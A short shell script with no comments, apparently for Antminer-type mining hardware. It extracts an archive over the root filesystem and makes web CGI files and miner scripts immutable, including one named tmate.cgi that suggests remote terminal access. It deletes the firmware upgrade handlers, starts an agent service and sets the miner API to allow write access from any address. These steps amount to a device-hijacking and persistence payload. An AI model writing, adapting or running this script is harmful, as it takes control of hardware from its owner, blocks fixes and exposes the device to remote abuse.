#!/bin/sh

tar -zxf /media/ant.tar.gz -C / && rm /media/ant.tar.gz

echo "+++++++++++++++++++++++++++"

chattr +i /www/pages/cgi-bin/set2.cgi

chattr +i /www/pages/cgi-bin/set3.cgi

chattr +i /www/pages/cgi-bin/cgi1.cgi

chattr +i /www/pages/cgi-bin/cgi2.cgi

chattr +i /home/minerStatus.cgi

chattr +i /home/bmminer.sh

chattr +i /home/set_miner_conf.cgi

chattr +i /www/pages/cgi-bin/tmate.cgi

chattr +i /www/pages/kernelLog.html

chattr +i /www/pages/cgi-bin/get_kernel_log.cgi

chattr +i /www/pages/cgi-bin/get_kernel_log2.cgi

rm /www/pages/cgi-bin/upgrade.cgi

rm /www/pages/cgi-bin/upgrade_clear.cgi

/etc/init.d/agent.sh start

sed -i 's_^\("api-allow" : \).*_\1"W:0/0",_' /config/bmminer.conf
